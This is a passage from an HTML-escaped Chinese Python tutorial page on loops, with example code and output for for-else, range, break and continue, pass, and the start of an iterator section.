   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; 小于 5&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; count &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; 大于或等于 5&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;for语句&#34;&gt;&lt;a href=&#34;#for语句&#34; class=&#34;headerlink&#34; title=&#34;for语句&#34;&gt;&lt;/a&gt;for语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;variable&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;sequence&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statements&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statements&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    
sites &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Baidu&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; site &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; sites&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; site &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;菜鸟教程!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;循环数据 &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; site&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;没有循环数据!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;完成循环!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;range函数&#34;&gt;&lt;a href=&#34;#range函数&#34; class=&#34;headerlink&#34; title=&#34;range函数&#34;&gt;&lt;/a&gt;range函数&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;QQ&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
0
1
2
5
1
4
7
-10
-50
-90
0 Google
1 Baidu
2 Runoob
3 Taobao
4 QQ
[0, 1, 2, 3, 4]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;break和continue&#34;&gt;&lt;a href=&#34;#break和continue&#34; class=&#34;headerlink&#34; title=&#34;break和continue&#34;&gt;&lt;/a&gt;break和continue&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    n &lt;span class=&#34;token operator&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;循环结束。&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    n &lt;span class=&#34;token operator&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;循环结束。&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
4
3
循环结束。
4
3
1
0
循环结束。
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;for-else&#34;&gt;&lt;a href=&#34;#for-else&#34; class=&#34;headerlink&#34; title=&#34;for-else&#34;&gt;&lt;/a&gt;for-else&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;等于&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 直接跳出第一个循环，不执行else&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# 循环中没有找到元素&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; 是质数&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
2  是质数
3  是质数
4 等于 2 * 2
5  是质数
6 等于 2 * 3
7  是质数
8 等于 2 * 4
9 等于 3 * 3
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;pass语句&#34;&gt;&lt;a href=&#34;#pass语句&#34; class=&#34;headerlink&#34; title=&#34;pass语句&#34;&gt;&lt;/a&gt;pass语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; letter &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; letter &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;o&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;执行 pass 块&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;当前字母 :&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; letter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Good bye!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
当前字母 : R
当前字母 : u
当前字母 : n
执行 pass 块
当前字母 : o
执行 pass 块
当前字母 : o
当前字母 : b
Good bye!
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pass 不做任何事情，一般用做占位语句&lt;/p&gt;
&lt;h2 id=&#34;迭代器和生成器&#34;&gt;&lt;a href=&#34;#迭代器和生成器&#34; class=&#34;headerlink&#34; title=&#34;迭代器和生成器&#34;&gt;&lt;/a&gt;迭代器和生成器&lt;/h2&gt;&lt;h3 id=&#34;迭代器&#34;&gt;&lt;a href=&#34;#迭代器&#34; class=&#34;headerlink&#34; title=&#34;迭代器&#34;&gt;&lt;/a&gt;迭代器&lt;/h3&gt;&lt;p&gt;迭代器两个基本函数&lt;code&gt;iter()&lt;/code&gt; &lt;code&gt;next()&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
it &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;iter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建迭代器对象&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;it&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出迭代器的下一个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;it&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;

